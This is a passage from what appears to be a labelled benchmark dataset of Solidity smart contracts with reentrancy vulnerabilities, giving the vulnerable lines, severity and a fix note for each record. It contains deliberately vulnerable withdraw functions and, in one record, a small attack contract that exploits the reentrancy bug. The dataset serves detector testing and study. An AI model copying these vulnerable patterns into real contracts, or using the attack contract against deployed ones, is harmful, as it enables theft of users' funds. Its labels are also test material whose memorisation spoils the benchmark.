    "original_source_path": "dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xcead721ef5b11f1a7b530171aab69b16c5e66b6e",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 29",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xf015c35649c82f5467c9c74b7f28ee67665aad68",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract MY_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function MY_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 29",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_etherbank",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "etherbank.sol",
    "file_content": "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/reentrant.sol\n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.0;\ncontract EtherBank{\n    mapping (address => uint) userBalances;\n    function getBalance(address user) constant returns(uint) {  \n\t\treturn userBalances[user];\n\t}\n\n\tfunction addToBalance() {  \n\t\tuserBalances[msg.sender] += msg.value;\n\t}\n\n\tfunction withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n\t\tif (!(msg.sender.call.value(amountToWithdraw)())) { throw; }\n\t\tuserBalances[msg.sender] = 0;\n\t}    \n}",
    "vulnerable_function": "withdrawBalance",
    "vulnerable_lines": [
      21
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 21",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/etherbank.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/reentrant.sol"
  },
  {
    "id": "smartbugs_reentrancy_etherstore",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "etherstore.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 27\n */\n\n//added pragma version\npragma solidity ^0.4.10;\n\ncontract EtherStore {\n\n    uint256 public withdrawalLimit = 1 ether;\n    mapping(address => uint256) public lastWithdrawTime;\n    mapping(address => uint256) public balances;\n\n    function depositFunds() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds (uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        // limit the withdrawal\n        require(_weiToWithdraw <= withdrawalLimit);\n        // limit the time allowed to withdraw\n        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);\n        // <yes> <report> REENTRANCY\n        require(msg.sender.call.value(_weiToWithdraw)());\n        balances[msg.sender] -= _weiToWithdraw;\n        lastWithdrawTime[msg.sender] = now;\n    }\n }\n",
    "vulnerable_function": "withdrawFunds",
    "vulnerable_lines": [
      27
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 27",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/etherstore.sol",
    "pragma": "0.4.10",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_reentrancy_modifier_reentrancy",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "modifier_reentrancy.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol\n * @author: - \n * @vulnerable_at_lines: 15\n */\n\npragma solidity ^0.4.24;\n\ncontract ModifierEntrancy {\n  mapping (address => uint) public tokenBalance;\n  string constant name = \"Nu Token\";\n\n  //If a contract has a zero balance and supports the token give them some token\n  // <yes> <report> REENTRANCY\n  function airDrop() hasNoBalance supportsToken  public{\n    tokenBalance[msg.sender] += 20;\n  }\n\n  //Checks that the contract responds the way we want\n  modifier supportsToken() {\n    require(keccak256(abi.encodePacked(\"Nu Token\")) == Bank(msg.sender).supportsToken());\n    _;\n  }\n  //Checks that the caller has a zero balance\n  modifier hasNoBalance {\n      require(tokenBalance[msg.sender] == 0);\n      _;\n  }\n}\n\ncontract Bank{\n    function supportsToken() external pure returns(bytes32){\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n}\n\ncontract attack{ //An example of a contract that breaks the contract above.\n    bool hasBeenCalled;\n    function supportsToken() external returns(bytes32){\n        if(!hasBeenCalled){\n            hasBeenCalled = true;\n            ModifierEntrancy(msg.sender).airDrop();\n        }\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n    function call(address token) public{\n        ModifierEntrancy(token).airDrop();\n    }\n}\n",
    "vulnerable_function": "airDrop",
    "vulnerable_lines": [
      15
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 15",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/modifier_reentrancy.sol",
    "pragma": "0.4.24",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol"
  },
  {
    "id": "smartbugs_reentrancy_reentrance",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrance.sol",
    "file_content": "/*\n * @source: https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488\n * @author: Alejandro Santander\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.18;\n\ncontract Reentrance {\n\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] += msg.value;\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      // <yes> <report> REENTRANCY\n      if(msg.sender.call.value(_amount)()) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  function() public payable {}\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      24
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 24",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrance.sol",
    "pragma": "0.4.18",
    "source_url": "https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488"
  },
  {
    "id": "smartbugs_reentrancy_reentrancy_bonus",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrancy_bonus.sol",
    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 28\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_bonus{\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n    mapping (address => bool) private claimedBonus;\n    mapping (address => uint) private rewardsForA;\n\n    function withdrawReward(address recipient) public {\n        uint amountToWithdraw = rewardsForA[recipient];\n        rewardsForA[recipient] = 0;\n        (bool success, ) = recipient.call.value(amountToWithdraw)(\"\");\n        require(success);\n    }\n\n    function getFirstWithdrawalBonus(address recipient) public {\n        require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n        rewardsForA[recipient] += 100;\n        // <yes> <report> REENTRANCY\n        withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n        claimedBonus[recipient] = true;\n    }\n}\n",
    "vulnerable_function": "getFirstWithdrawalBonus",
    "vulnerable_lines": [
      28
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 28",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrancy_bonus.sol",
    "pragma": "0.4.24",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/known_attacks/"
  },
  {
    "id": "smartbugs_reentrancy_reentrancy_cross_function",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrancy_cross_function.sol",
    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_cross_function {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function transfer(address to, uint amount) {\n        if (userBalances[msg.sender] >= amount) {\n            userBalances[to] += amount;\n            userBalances[msg.sender] -= amount;\n        }\n    }\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call transfer()\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}\n",
    "vulnerable_function": "withdrawBalance",
    "vulnerable_lines": [
      24
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 24",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrancy_cross_function.sol",
    "pragma": "0.4.24",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/known_attacks/"
  },
  {
    "id": "smartbugs_reentrancy_reentrancy_dao",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrancy_dao.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.19;\n\ncontract ReentrancyDAO {\n    mapping (address => uint) credit;\n    uint balance;\n\n    function withdrawAll() public {\n        uint oCredit = credit[msg.sender];\n        if (oCredit > 0) {\n            balance -= oCredit;\n            // <yes> <report> REENTRANCY\n            bool callResult = msg.sender.call.value(oCredit)();\n            require (callResult);\n            credit[msg.sender] = 0;\n        }\n    }\n\n    function deposit() public payable {\n        credit[msg.sender] += msg.value;\n        balance += msg.value;\n    }\n}\n",
    "vulnerable_function": "withdrawAll",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 18",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrancy_dao.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite"
  },
  {
    "id": "smartbugs_reentrancy_reentrancy_insecure",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrancy_insecure.sol",
    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.5.0;\n\ncontract Reentrancy_insecure {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call withdrawBalance again\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}\n",
    "vulnerable_function": "withdrawBalance",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 17",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrancy_insecure.sol",
    "pragma": "0.5.0",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/known_attacks/"
  },
  {
    "id": "smartbugs_reentrancy_reentrancy_simple",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "reentrancy_simple.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/Reentrancy.sol\n * @author: -\n * @vulnerable_at_lines: 24\n */\n\n pragma solidity ^0.4.15;\n\n contract Reentrance {\n     mapping (address => uint) userBalance;\n\n     function getBalance(address u) constant returns(uint){\n         return userBalance[u];\n     }\n\n     function addToBalance() payable{\n         userBalance[msg.sender] += msg.value;\n     }\n\n     function withdrawBalance(){\n         // send userBalance[msg.sender] ethers to msg.sender\n         // if mgs.sender is a contract, it will call its fallback function\n         // <yes> <report> REENTRANCY\n         if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n             throw;\n         }\n         userBalance[msg.sender] = 0;\n     }\n }\n",
    "vulnerable_function": "withdrawBalance",
    "vulnerable_lines": [
      24
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 24",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/reentrancy_simple.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/Reentrancy.sol"
  },
  {
    "id": "smartbugs_reentrancy_simple_dao",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "simple_dao.sol",
    "file_content": "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao\n * @author: -\n * @vulnerable_at_lines: 19\n */\n\npragma solidity ^0.4.2;\n\ncontract SimpleDAO {\n  mapping (address => uint) public credit;\n\n  function donate(address to) payable {\n    credit[to] += msg.value;\n  }\n\n  function withdraw(uint amount) {\n    if (credit[msg.sender]>= amount) {\n      // <yes> <report> REENTRANCY\n      bool res = msg.sender.call.value(amount)();\n      credit[msg.sender]-=amount;\n    }\n  }\n\n  function queryCredit(address to) returns (uint){\n    return credit[to];\n  }\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      19
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 19",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/simple_dao.sol",
    "pragma": "0.4.2",
    "source_url": "http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao"
  },
  {
    "id": "smartbugs_reentrancy_spank_chain_payment",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "spank_chain_payment.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/SpankChain_source_code/SpankChain_Payment.sol\n * @author: -\n * @vulnerable_at_lines: 426,430\n */\n\n // https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code\n\n pragma solidity ^0.4.23;\n // produced by the Solididy File Flattener (c) David Appleton 2018\n // contact : dave@akomba.com\n // released under Apache 2.0 licence\n contract Token {\n     /* This is a slight change to the ERC20 base standard.\n     function totalSupply() constant returns (uint256 supply);\n     is replaced with:\n     uint256 public totalSupply;\n     This automatically creates a getter function for the totalSupply.\n     This is moved to the base contract since public getter functions are not\n     currently recognised as an implementation of the matching abstract\n     function by the compiler.\n     */\n     /// total amount of tokens\n     uint256 public totalSupply;\n\n     /// @param _owner The address from which the balance will be retrieved\n     /// @return The balance\n     function balanceOf(address _owner) public constant returns (uint256 balance);\n\n     /// @notice send `_value` token to `_to` from `msg.sender`\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function transfer(address _to, uint256 _value) public returns (bool success);\n\n     /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n     /// @param _from The address of the sender\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n\n     /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @param _value The amount of tokens to be approved for transfer\n     /// @return Whether the approval was successful or not\n     function approve(address _spender, uint256 _value) public returns (bool success);\n\n     /// @param _owner The address of the account owning tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @return Amount of remaining tokens allowed to spent\n     function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n\n     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n     event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n }\n\n library ECTools {\n\n     // @dev Recovers the address which has signed a message\n     // @thanks https://gist.github.com/axic/5b33912c6f61ae6fd96d6c4a47afde6d\n     function recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\n         require(_hashedMsg != 0x00);\n\n         // need this for test RPC\n         bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n         bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\n\n         if (bytes(_sig).length != 132) {\n             return 0x0;\n         }\n         bytes32 r;\n         bytes32 s;\n         uint8 v;\n         bytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\n         assembly {\n             r := mload(add(sig, 32))\n             s := mload(add(sig, 64))\n             v := byte(0, mload(add(sig, 96)))\n         }\n         if (v < 27) {\n             v += 27;\n         }\n         if (v < 27 || v > 28) {\n             return 0x0;\n         }\n         return ecrecover(prefixedHash, v, r, s);\n     }\n\n     // @dev Verifies if the message is signed by an address\n     function isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\n         require(_addr != 0x0);\n\n         return _addr == recoverSigner(_hashedMsg, _sig);\n     }\n\n     // @dev Converts an hexstring to bytes\n     function hexstrToBytes(string _hexstr) public pure returns (bytes) {\n         uint len = bytes(_hexstr).length;\n         require(len % 2 == 0);\n\n         bytes memory bstr = bytes(new string(len / 2));\n         uint k = 0;\n         string memory s;\n         string memory r;\n         for (uint i = 0; i < len; i += 2) {\n             s = substring(_hexstr, i, i + 1);\n             r = substring(_hexstr, i + 1, i + 2);\n             uint p = parseInt16Char(s) * 16 + parseInt16Char(r);\n             bstr[k++] = uintToBytes32(p)[31];\n         }\n         return bstr;\n     }\n\n     // @dev Parses a hexchar, like 'a', and returns its hex value, in this case 10\n     function parseInt16Char(string _char) public pure returns (uint) {\n         bytes memory bresult = bytes(_char);\n         // bool decimals = false;\n         if ((bresult[0] >= 48) && (bresult[0] <= 57)) {\n             return uint(bresult[0]) - 48;\n         } else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\n             return uint(bresult[0]) - 55;\n         } else if ((bresult[0] >= 97) && (bresult[0] <= 102)) {\n             return uint(bresult[0]) - 87;\n         } else {\n             revert();\n         }\n     }\n\n     // @dev Converts a uint to a bytes32\n     // @thanks https://ethereum.stackexchange.com/questions/4170/how-to-convert-a-uint-to-bytes-in-solidity\n     function uintToBytes32(uint _uint) public pure returns (bytes b) {\n         b = new bytes(32);\n         assembly {mstore(add(b, 32), _uint)}\n     }\n\n     // @dev Hashes the signed message\n     // @ref https://github.com/ethereum/go-ethereum/issues/3731#issuecomment-293866868\n     function toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\n         uint len = bytes(_msg).length;\n         require(len > 0);\n         bytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\n         return keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n     }\n\n     // @dev Converts a uint in a string\n     function uintToString(uint _uint) public pure returns (string str) {\n         uint len = 0;\n         uint m = _uint + 0;\n         while (m != 0) {\n             len++;\n             m /= 10;\n         }\n         bytes memory b = new bytes(len);\n         uint i = len - 1;\n         while (_uint != 0) {\n             uint remainder = _uint % 10;\n             _uint = _uint / 10;\n             b[i--] = byte(48 + remainder);\n         }\n         str = string(b);\n     }\n\n\n     // @dev extract a substring\n     // @thanks https://ethereum.stackexchange.com/questions/31457/substring-in-solidity\n     function substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\n         bytes memory strBytes = bytes(_str);\n         require(_startIndex <= _endIndex);\n         require(_startIndex >= 0);\n         require(_endIndex <= strBytes.length);\n\n         bytes memory result = new bytes(_endIndex - _startIndex);\n         for (uint i = _startIndex; i < _endIndex; i++) {\n             result[i - _startIndex] = strBytes[i];\n         }\n         return string(result);\n     }\n }\n contract StandardToken is Token {\n\n     function transfer(address _to, uint256 _value) public returns (bool success) {\n         //Default assumes totalSupply can't be over max (2^256 - 1).\n         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n         //Replace the if with this one instead.\n         //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(balances[msg.sender] >= _value);\n         balances[msg.sender] -= _value;\n         balances[_to] += _value;\n         emit Transfer(msg.sender, _to, _value);\n         return true;\n     }\n\n     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n         //same as above. Replace this line with the following if you want to protect against wrapping uints.\n         //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n         balances[_to] += _value;\n         balances[_from] -= _value;\n         allowed[_from][msg.sender] -= _value;\n         emit Transfer(_from, _to, _value);\n         return true;\n     }\n\n     function balanceOf(address _owner) public constant returns (uint256 balance) {\n         return balances[_owner];\n     }\n\n     function approve(address _spender, uint256 _value) public returns (bool success) {\n         allowed[msg.sender][_spender] = _value;\n         emit Approval(msg.sender, _spender, _value);\n         return true;\n     }\n\n     function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n       return allowed[_owner][_spender];\n     }\n\n     mapping (address => uint256) balances;\n     mapping (address => mapping (address => uint256)) allowed;\n }\n\n contract HumanStandardToken is StandardToken {\n\n     /* Public variables of the token */\n\n     /*\n     NOTE:\n     The following variables are OPTIONAL vanities. One does not have to include them.\n     They allow one to customise the token contract & in no way influences the core functionality.\n     Some wallets/interfaces might not even bother to look at this information.\n     */\n     string public name;                   //fancy name: eg Simon Bucks\n     uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n     string public symbol;                 //An identifier: eg SBX\n     string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n     constructor(\n         uint256 _initialAmount,\n         string _tokenName,\n         uint8 _decimalUnits,\n         string _tokenSymbol\n         ) public {\n         balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\n         totalSupply = _initialAmount;                        // Update total supply\n         name = _tokenName;                                   // Set the name for display purposes\n         decimals = _decimalUnits;                            // Amount of decimals for display purposes\n         symbol = _tokenSymbol;                               // Set the symbol for display purposes\n     }\n\n     /* Approves and then calls the receiving contract */\n     function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n         allowed[msg.sender][_spender] = _value;\n         emit Approval(msg.sender, _spender, _value);\n\n         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n         require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n         return true;\n     }\n }\n\n contract LedgerChannel {\n\n     string public constant NAME = \"Ledger Channel\";\n     string public constant VERSION = \"0.0.1\";\n\n     uint256 public numChannels = 0;\n\n     event DidLCOpen (\n         bytes32 indexed channelId,\n         address indexed partyA,\n         address indexed partyI,\n         uint256 ethBalanceA,\n         address token,\n         uint256 tokenBalanceA,\n         uint256 LCopenTimeout\n     );\n\n     event DidLCJoin (\n         bytes32 indexed channelId,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI\n     );\n\n     event DidLCDeposit (\n         bytes32 indexed channelId,\n         address indexed recipient,\n         uint256 deposit,\n         bool isToken\n     );\n\n     event DidLCUpdateState (\n         